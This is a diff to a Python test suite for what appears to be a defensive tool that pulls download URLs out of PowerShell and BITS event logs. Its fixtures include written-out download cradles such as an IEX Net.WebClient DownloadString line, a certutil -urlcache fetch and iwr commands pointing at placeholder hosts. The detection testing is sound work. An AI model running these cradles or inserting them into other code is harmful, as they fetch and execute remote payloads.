@@ -189,10 +189,11 @@ def test_decoy_urls_before_the_payload_do_not_hide_it():
     assert len(s.powershell()[1]["urls"]) == firewall_store.MAX_URLS
 
 
-def test_powershell_and_bits_are_kept_only_with_a_url():
+def test_powershell_and_bits_are_kept_only_when_they_name_an_executable():
     s = FirewallStore()
-    assert s.add_powershell([ps("Get-Date"), ps("iwr http://a.b/c.dll")]) == 1
-    assert s.add_bits([bits("http://a.b/s.exe"), bits("not a url"), {"event_id": 59}]) == 1
+    assert s.add_powershell([ps("Get-Date"), ps("iwr http://a.b/page.html"), ps("iwr http://a.b/c.dll")]) == 1
+    assert s.add_bits([bits("http://a.b/s.exe"), bits("http://a.b/page.html"), bits("not a url"),
+                       {"event_id": 59}]) == 1
     assert len(s.powershell()) == 1 and len(s.bits()) == 1
 
 
@@ -217,7 +218,7 @@ def test_urls_in_finds_cradles_and_ignores_the_rest():
     assert urls_in("IEX(New-Object Net.WebClient).DownloadString('http://a.b/c.dll')") == ["http://a.b/c.dll"]
     assert urls_in("certutil -urlcache -f https://x.y/z.exe out.exe") == ["https://x.y/z.exe"]
     assert urls_in("no url here") == []
-    assert urls_in("http://" + "a" * 5000) == []          # length guard
+    assert urls_in("http://" + "a" * 9000) == []          # length guard
 
 
 def test_urls_in_trims_punctuation_dedupes_and_caps_the_count():
@@ -229,8 +230,18 @@ def test_urls_in_trims_punctuation_dedupes_and_caps_the_count():
 
 
 def test_urls_in_drops_the_long_one_and_keeps_the_others():
-    assert urls_in("http://" + "a" * 3000 + " http://a.b/c.dll") == ["http://a.b/c.dll"]
-    assert len(urls_in("http://" + "a" * 2041)[0]) == 2048           # right at the limit
+    assert urls_in("http://" + "a" * 9000 + " http://a.b/c.dll") == ["http://a.b/c.dll"]
+    assert len(urls_in("http://" + "a" * (8192 - 7))[0]) == 8192     # right at the limit
+    assert urls_in("http://" + "a" * (8192 - 6)) == []
+
+
+def test_a_url_with_a_long_query_is_still_found():
+    # a stage-2 URL may carry a base64 blob; padding the URL itself must not hide it
+    long_url = "http://a.b/c.dll?x=" + "QUFB" * 1500
+    assert urls_in(f"iwr '{long_url}'") == [long_url]
+    s = FirewallStore()
+    s.add_powershell([ps(f"iwr '{long_url}'")])
+    assert [f["url"] for f in download_findings(s.powershell(), [], [], FLOWS, {4812})] == [long_url]
 
 
 def test_urls_in_is_linear_on_a_big_text():
@@ -909,6 +920,44 @@ def test_the_powershell_reader_keeps_event_record_ids_and_events_without_any_are
     assert "record_id" in store.stats()["hints"]["powershell"] and len(store.powershell()) == 1
     c.tick()
     assert seen == [None, 31, 31]
+
+
+def test_a_position_that_is_no_number_is_not_kept_and_the_events_say_where_they_are(tmp_path):
+    seen = []
+    results = iter([([ps("iwr http://a.b/c.dll", record_id=31)], "abc"), ([ps("iwr http://a.b/d.dll", record_id=32)], "40"),
+                    ([], True), ([], 2.5)])
+
+    def read_ps(since=None):
+        seen.append(since)
+        return next(results)
+
+    store, c = collector(tmp_path, readers(powershell=read_ps))
+    for _ in range(4):
+        c.tick()
+    assert seen == [None, 31, 40, 40]                      # "abc" -> the events' 31; "40" is a number; True and 2.5 are not
+    assert store.stats()["status"]["powershell"] == "ok" and len(store.powershell()) == 2
+
+
+def test_a_missing_position_is_taken_from_the_events_not_left_unset(tmp_path):
+    seen = []
+    results = iter([([ps("iwr http://a.b/c.dll", record_id=7)], None), ([], None)])
+
+    def read_ps(since=None):
+        seen.append(since)
+        return next(results)
+
+    store, c = collector(tmp_path, readers(powershell=read_ps))
+    c.tick()
+    c.tick()
+    assert seen == [None, 7] and len(store.powershell()) == 1       # the next read does not bring the event again
+
+
+def test_events_with_no_usable_position_at_all_are_refused(tmp_path):
+    for position in (None, "abc"):
+        store, c = collector(tmp_path, readers(bits=lambda since=None, p=position: ([bits("http://a.b/s.exe")], p)),
+                             window=True)
+        c.tick()
+        assert store.stats()["status"]["bits"] == "unavailable" and store.bits() == []
 
 
 def test_a_reader_that_reports_an_error_marks_the_source_unavailable_and_recovers(tmp_path):
